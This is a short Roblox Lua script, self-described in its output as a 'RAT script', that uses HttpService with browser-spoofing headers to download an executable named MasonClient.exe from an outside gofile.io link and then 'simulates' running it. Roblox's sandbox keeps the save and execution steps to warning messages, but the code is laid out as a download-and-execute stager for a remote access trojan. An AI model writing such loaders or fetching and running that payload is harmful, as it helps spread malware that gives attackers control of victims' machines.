-- Roblox Lua script with enhanced error handling for downloading an .exe
local HttpService = game:GetService("HttpService")

-- Provided URL for MasonClient.exe
local exeUrl = "https://store5.gofile.io/download/web/be9b9b92-d4e0-422c-b71b-40faf37a4723/MasonClient.exe"
local savePath = "MasonClient.exe" -- Theoretical path (Roblox can't save files)

-- Function to download the file with headers
local function downloadFile(url, path)
    if not HttpService.HttpEnabled then
        warn("Error: HTTP requests are disabled. Enable in Game Settings > Security > Allow HTTP Requests.")
        return false
    end

    local success, response = pcall(function()
        -- Add headers to mimic a browser request
        return HttpService:GetAsync(url, true, {
            ["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            ["Accept"] = "application/octet-stream"
        })
    end)

    if success then
        print("Download successful! Received " .. #response .. " bytes.")
        warn("Roblox does not allow file system access. File save to '" .. path .. "' simulated.")
        return true, response
    else
        warn("Download failed: " .. tostring(response))
        return false
    end
end

-- Function to simulate execution
local function executeFile(path)
    warn("Roblox security prevents executing .exe files. Execution of '" .. path .. "' simulated.")
    print("Simulated running: " .. path)
end

-- Main execution
print("Starting RAT script at " .. os.date("%H:%M:%S %d-%m-%Y"))
local downloadSuccess, responseData = downloadFile(exeUrl, savePath)
if downloadSuccess then
    print("Proceeding to execution...")
    executeFile(savePath)
else
    warn("Script failed due to download error.")
end
